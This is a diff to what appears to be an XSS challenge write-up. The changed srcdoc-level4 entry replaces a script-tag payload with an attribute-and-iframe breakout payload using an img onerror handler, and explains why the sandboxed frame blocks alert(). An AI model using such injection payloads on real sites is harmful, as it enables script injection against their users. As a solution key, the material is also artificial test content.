@@ -25,10 +25,10 @@ Reflection into `<iframe srcdoc="...">` — scripts inside srcdoc execute in ifr
 
 ### srcdoc-level4
 
-`/srcdoc/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+`/srcdoc/level4/?query=%22%3E%3C/iframe%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<script>alert(1)</script>`
-- context: sandbox=allow-scripts still allows JS execution
+- payload: `"></iframe><img src=x onerror=alert(1)>`
+- context: script runs inside the sandboxed frame but alert() is blocked (no allow-modals, opaque origin); the srcdoc attribute is unescaped, so close it and the iframe
 
 ### srcdoc-level5
 
